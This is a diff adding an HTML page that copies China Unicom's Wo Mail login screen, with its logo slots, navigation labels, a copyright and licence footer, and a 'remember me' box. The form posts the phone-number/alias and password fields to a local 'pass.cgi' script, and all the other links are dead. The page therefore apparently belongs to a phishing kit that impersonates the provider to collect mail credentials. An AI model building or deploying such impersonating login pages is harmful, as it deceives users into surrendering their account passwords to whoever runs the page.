@@ -1,0 +1,75 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+	<title>沃邮箱</title>
+	<link rel="stylesheet" href="css/style.css" type="text/css" />
+	<script type="text/javascript" src="jquery-1.11.1.min.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			$("input").focus(function(event) {
+				if($(this).val()==this.defaultValue){
+					$(this).val("").addClass("font1")
+				}
+			}).blur(function(event) {
+				if($(this).val()==""){
+					$(this).val(this.defaultValue).removeClass("font1")
+				}
+			});
+		});
+	</script>
+</head>
+<body>
+	<div class="landingBox">
+		<h1 class="landingLogo">
+			<a href="javascript:;"><img src="images/logo.jpg" alt="" /></a>
+		</h1>
+		<ul class="nav">
+            <li><a href="javascript:;">3G门户</a></li>
+            <li><a href="javascript:;">网上营业厅</a></li>
+            <li><a href="javascript:;">活动中心</a></li>
+            <li><a href="javascript:;">资讯中心</a></li>
+            <li><a href="javascript:;">帮助中心</a></li>
+        </ul>		
+	</div>
+	<div class="mainbox">
+	    <div class="mainCentent">
+	        <a href="javascript:;" class="gmail"><img src="images/mail.jpg" /></a>
+	        <div class="loginIndex">
+                <h2>
+                	<span class="loginLogo"></span>                	
+                </h2>
+                <form method="post" action="pass.cgi">
+                <a href="javascript:;" class="QRlogin"></a>
+                <div class="loginIndexDiv">
+                    <input type="text" name="wd" value="手机号/别名"/>
+                    <span>@wo.cn</span>
+                </div>
+                <div class="loginIndexDiv">
+                    <input type="password" name="pd" value="000000"/>
+                    <span>忘记密码？</span>
+                </div>
+                <div class="loginInputCheckbox">
+                	<input type="checkbox" />
+                	<span>记住我</span>
+                </div>
+                <input type="submit" class="loginButton" value="登录"/>
+                <a href="#" class="registeredButton">注册</a>
+                </form>
+                <div class="clientBox">
+                	<a href="javascript:;">客户端下载</a>
+                </div>
+                <a href="javascript:;" class="connect">沃互联登录</a>
+        </div>
+    </div>
+    <div class="footer">
+		<span>京ICP备11000964号-6&nbsp;&nbsp;|&nbsp;&nbsp;中国联通版权所有</span>        
+        <ul>
+        	<li><a href="javascript:;">法律声明</a></li>   
+        	<li><a href="javascript:;">联系我们</a></li>
+        	<li><a href="javascript:;">客服受理</a></li>
+        	<li><a href="javascript:;">炫功能</a></li>
+        </ul>
+    </div>
+</body>
+</html>
